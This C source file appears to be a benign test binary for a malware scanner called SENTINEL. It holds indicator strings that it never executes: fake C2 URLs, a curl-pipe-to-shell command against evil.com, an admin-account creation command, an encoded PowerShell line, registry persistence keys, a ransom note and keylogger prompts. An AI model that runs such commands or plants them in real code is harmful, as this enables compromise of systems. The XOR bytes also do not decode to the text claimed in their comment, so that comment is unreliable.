/**
 * SENTINEL Test Binary - Suspicious Looking but Safe
 * 
 * This is a SAFE test binary that contains patterns commonly found in malware
 * to test our detection capabilities. It doesn't actually do anything harmful.
 * 
 * Suspicious patterns included:
 * - Network-related strings
 * - Registry key strings
 * - Shell command strings  
 * - Encoded/obfuscated data
 * - Anti-debugging API names
 * - Crypto-related strings
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Fake C2 server URLs (these are not real and do nothing)
const char* c2_servers[] = {
    "http://evil-command-server.xyz/beacon",
    "https://malware-c2.onion/check-in",
    "tcp://192.168.1.100:4444",
    "http://update.totally-legit-software.com/payload.exe"
};

// Fake registry keys (Windows-style, but we're on Linux)
const char* registry_keys[] = {
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware_svc"
};

// Suspicious shell commands (just strings, not executed)
const char* shell_commands[] = {
    "cmd.exe /c whoami",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "net user admin P@ssw0rd /add",
    "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "/bin/bash -c 'curl http://evil.com/shell.sh | sh'"
};

// Fake API names that trigger detection
const char* suspicious_apis[] = {
    "VirtualAllocEx",
    "WriteProcessMemory", 
    "CreateRemoteThread",
    "NtQueryInformationProcess",
    "IsDebuggerPresent",
    "CheckRemoteDebuggerPresent",
    "GetProcAddress",
    "LoadLibraryA",
    "RegSetValueExA",
    "InternetOpenA",
    "HttpSendRequestA",
    "CryptEncrypt",
    "CryptDecrypt"
};

// Base64 encoded "secret" (decodes to "This is a test secret message")
const char* encoded_payload = "VGhpcyBpcyBhIHRlc3Qgc2VjcmV0IG1lc3NhZ2U=";

// XOR "encrypted" data (key: 0x42)
unsigned char xor_encrypted[] = {
    0x16, 0x23, 0x2b, 0x2d, 0x42, 0x2b, 0x2d, 0x42, // "This is "
    0x22, 0x20, 0x2e, 0x2b, 0x26, 0x2f, 0x22, 0x26  // "harmless"
};

// Fake mutex name (used by malware for single-instance)
const char* mutex_name = "Global\\{8F6F0AC4-B9A1-45FD-A8CF-72F04E6BDE8F}";

// Cryptocurrency wallet addresses (fake)
const char* crypto_wallets[] = {
    "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",  // Bitcoin
    "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD71",   // Ethereum
    "TJCnKsPa7y5okkXvQAidZBzqx3QyQ6sxMW"            // Tron
};

// Ransom note text
const char* ransom_note = 
    "YOUR FILES HAVE BEEN ENCRYPTED!\n"
    "To decrypt your files, send 0.5 BTC to: bc1q...\n"
    "After payment, email: decrypt@evil-hackers.com\n"
    "You have 72 hours before files are deleted permanently.";

// File extensions targeted by ransomware (just strings)
const char* target_extensions[] = {
    ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", 
    ".png", ".sql", ".mdb", ".pst", ".dwg", ".psd"
};

// Keylogger-style strings
const char* keylog_strings[] = {
    "[ENTER]", "[BACKSPACE]", "[TAB]", "[CTRL]",
    "password:", "login:", "username:", "credit card:"
};

void print_banner(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║     SENTINEL TEST BINARY - SUSPICIOUS BUT SAFE               ║\n");
    printf("║                                                              ║\n");
    printf("║  This binary contains patterns that trigger malware          ║\n");
    printf("║  detection, but it is completely HARMLESS.                   ║\n");
    printf("║                                                              ║\n");
    printf("║  Purpose: Test SENTINEL analysis capabilities                ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
}

void simulate_suspicious_behavior(void) {
    printf("[*] Simulating suspicious behavior (not actually doing anything)...\n\n");
    
    printf("[1] Would connect to C2 server: %s\n", c2_servers[0]);
    printf("[2] Would add registry key: %s\n", registry_keys[0]);
    printf("[3] Would execute: %s\n", shell_commands[0]);
    printf("[4] Would call API: %s\n", suspicious_apis[0]);
    printf("[5] Would use mutex: %s\n", mutex_name);
    printf("[6] Has encoded payload: %s\n", encoded_payload);
    printf("[7] Would target wallets: %s\n", crypto_wallets[0]);
    
    printf("\n[*] Ransom note preview:\n%s\n", ransom_note);
}

// Anti-analysis tricks (just function names, they don't do anything)
int check_debugger(void) {
    // This would normally check for debuggers
    // But we just return 0 (not debugged)
    volatile int debugger_present = 0;
    return debugger_present;
}

int check_virtual_machine(void) {
    // This would check for VM artifacts
    // Returns 0 (not in VM) - doesn't actually check
    return 0;
}

int check_sandbox(void) {
    // This would detect sandbox environments
    // Returns 0 - doesn't actually check
    return 0;
}

void decrypt_strings(void) {
    // Pretend to decrypt strings with XOR
    printf("[*] Decrypting embedded strings...\n");
    char decrypted[32];
    for (int i = 0; i < sizeof(xor_encrypted); i++) {
        decrypted[i] = xor_encrypted[i] ^ 0x42;
    }
    decrypted[sizeof(xor_encrypted)] = '\0';
    printf("[*] Decrypted: %s\n", decrypted);
}

int main(int argc, char** argv) {
    print_banner();
    
    printf("[*] Checking environment...\n");
    if (check_debugger()) {
        printf("[-] Debugger detected! Exiting...\n");
        return 1;
    }
    if (check_virtual_machine()) {
        printf("[-] Virtual machine detected! Exiting...\n");
        return 1;
    }
    if (check_sandbox()) {
        printf("[-] Sandbox detected! Exiting...\n");
        return 1;
    }
    printf("[+] Environment checks passed\n\n");
    
    decrypt_strings();
    printf("\n");
    
    simulate_suspicious_behavior();
    
    printf("\n[*] Test binary completed successfully.\n");
    printf("[*] This was a SAFE test - nothing malicious was executed.\n\n");
    
    return 0;
}
